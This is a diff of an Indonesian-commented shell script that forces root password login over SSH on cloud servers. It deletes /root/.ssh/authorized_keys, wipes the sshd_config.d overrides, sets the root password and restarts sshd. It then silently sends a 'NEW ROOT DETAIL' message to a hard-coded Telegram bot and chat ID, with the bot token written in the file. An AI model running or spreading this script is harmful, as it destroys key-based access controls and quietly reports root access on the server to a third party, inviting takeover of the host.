@@ -49,28 +49,32 @@ fi
 # Set password root
 echo "root:$pass" | chpasswd
 
-# === BAGIAN POWERFULL (MEMAKSA SETTING SSH AWS/GCP) ===
-# 1. Edit file utama sshd_config dengan Regex
+# === BAGIAN SUPER POWERFULL (FORCE BYPASS) ===
+
+# 1. HAPUS PEMBATAS LOGIN (SOLUSI BIZNET)
+# Menghapus file yang memaksa login via user Udpgtn
+rm -f /root/.ssh/authorized_keys
+
+# 2. HANCURKAN settingan tersembunyi (Cloud-Init / sshd_config.d)
+# Ini penting agar settingan utama tidak tertimpa
+if [ -d /etc/ssh/sshd_config.d ]; then
+    rm -rf /etc/ssh/sshd_config.d/*
+fi
+
+# 3. Edit file utama sshd_config
 sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
 sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
 sed -i 's/^#\?ChallengeResponseAuthentication.*/ChallengeResponseAuthentication yes/g' /etc/ssh/sshd_config
 
-# 2. HANCURKAN settingan tersembunyi (AWS/GCP/Azure)
-if [ -d /etc/ssh/sshd_config.d ]; then
-    sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config.d/*.conf 2>/dev/null
-    sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config.d/*.conf 2>/dev/null
-fi
-
-# 3. Restart SSH (Dual Support: ssh & sshd)
+# 4. Restart SSH (Dual Support)
 systemctl restart ssh 2>/dev/null || systemctl restart sshd 2>/dev/null
 
-# === KONFIGURASI TELEGRAM (FORMAT BARU) ===
+# === KONFIGURASI TELEGRAM (GTN NOTIF) ===
 TIMES="10"
 CHATID="7673056681"          
 KEY="8469184822:AAExctKaFuK4pDon7p0X7OxPW16rxT2az_8"  
 URL="https://api.telegram.org/bot${KEY}/sendMessage"
 
-# Format Pesan Sesuai Permintaan
 TEXT="
 ────────────────────
 <b>     ☘ NEW ROOT DETAIL ☘</b>
@@ -81,7 +85,7 @@ TEXT="
 <code>ISP       :</code> <code>${ISP}</code>
 <code>Author    :</code> <code>@Deki_niswara</code>
 ────────────────────
-<i>Note: Auto notif from your script...</i>
+<i>Note: Auto bypass activated...</i>
 "
 
 # Kirim pesan (diam)
